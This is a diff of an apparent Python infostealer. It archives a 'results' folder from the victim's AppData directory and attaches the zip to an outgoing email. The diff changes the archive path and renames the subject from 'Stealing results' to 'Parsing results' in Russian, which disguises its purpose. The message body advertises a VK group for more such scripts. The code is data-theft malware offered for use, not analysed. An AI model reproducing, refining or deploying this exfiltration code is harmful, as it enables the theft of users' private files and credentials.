@@ -82,11 +82,11 @@ try:
     file.close()
 
     directory_name = rf'C:\\Users\\{user}\\AppData\\files\\results'
-    zip_name = rf'{user}'
+    zip_name = rf'C:\\Users\\{user}\\AppData\\files\\{user}-st'
 
     shutil.make_archive(zip_name, 'zip', directory_name)
 
-    subject = rf"Результаты стиллинга {user}"
+    subject = rf"Результаты парсинга {user}"
     body = "Больше скриптов здесь - vk.com/club194891560"
 
     message = MIMEMultipart()
@@ -96,9 +96,10 @@ try:
 
     message.attach(MIMEText(body, "plain"))
 
-    filename = rf"{user}.zip"
+    file = rf'C:\\Users\\{user}\\AppData\\files\\{user}-st.zip'
+    filename = rf'{user}-st.zip'
 
-    with open(filename, "rb") as attachment:
+    with open(file, "rb") as attachment:
         part = MIMEBase("application", "octet-stream")
         part.set_payload(attachment.read())
 
